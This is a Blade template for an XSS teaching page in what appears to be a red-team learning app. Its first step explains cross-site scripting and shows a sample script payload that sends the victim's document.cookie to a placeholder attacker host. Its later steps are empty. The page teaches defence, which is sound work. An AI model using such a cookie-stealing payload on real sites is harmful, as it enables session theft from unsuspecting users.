@extends('redteam.base')

@section('title', 'Cross-Site Scripting Learning Page')

@section('pagecontent')
<div class="redLearn">
    <form method="POST" action="/learn/xss">
        @csrf
        <input type="hidden" name="step" value="{{ $step }}">
        @if ($step != 1)
            <div class="form-group row mb-0">
                <div class="col-md-8 offset-md-4">
                    <button type="submit" class="btn btn-primary" name="stepChange" value="-1">
                        Previous
                    </button>
                </div>
            </div>
        @endif

        @if ($step == 1)
            <h4>What is an XSS attack?</h4>
            <p>An XSS, or cross-site scripting, attack is when an attacker injects code into a server <br>
                in order to execute malicious javascript on another user's browser. The attacker exploits <br>
                a vulnerability in the website in order to make the malicious javascript appear as it were <br>
                to be a legitimate part of the website.</p>
            <p>If a server uses a script similar to this: </p>
            <p class="sqlInject"><strong>print "<?php echo htmlspecialchars("<html>") ?>" <br>
                print "User Input:" <br>
                print database.userInput <br>
                print "<?php echo htmlspecialchars("</html>") ?>"</strong></p>
            <p>A user could create user input that says: </p>
            <p class="sqlInject"><strong><?php echo htmlspecialchars("<script>") ?>
                window.location='http://attackerswebsite/?cookie='+document.cookie
                <?php echo htmlspecialchars("</script>") ?></strong></p>
            <p>The resulting output on the webpage would then result in: </p>
            <p class="sqlInject"><strong><?php echo htmlspecialchars("<html>") ?> <br>
                User Input: <br>
                <?php echo htmlspecialchars("<script>") ?> <br>
                window.location='http://attackerswebsite/?cookie='+document.cookie <br>
                <?php echo htmlspecialchars("</script>") ?> <br>
                <?php echo htmlspecialchars("</html>") ?></strong></p>
            <p>This malicious javascript displayed on an unsuspecting user's page <br>
                will then execute this javascript and send a request to the attackers <br>
                webpage with the victims cookie as data. This is an example of how <br>
                attackers can obtain private or sensitive information by XSS.</p>
        @elseif ($step == 2)
            <h4></h4>
            <p></p>

        @elseif ($step == 3)
            <h4></h4>
            <p></p>

        @elseif ($step == 4)
            <h4></h4>
            <p></p>

        @endif
        <!-- Reference:  https://excess-xss.com/ -->
        @if ($step != 4)
            <div class="form-group row mb-0">
                <div class="col-md-8 offset-md-4">
                    <button type="submit" class="btn btn-primary" name="stepChange" value="1">
                        Next
                    </button>
                </div>
            </div>
        @endif
    </form>
</div>
@endsection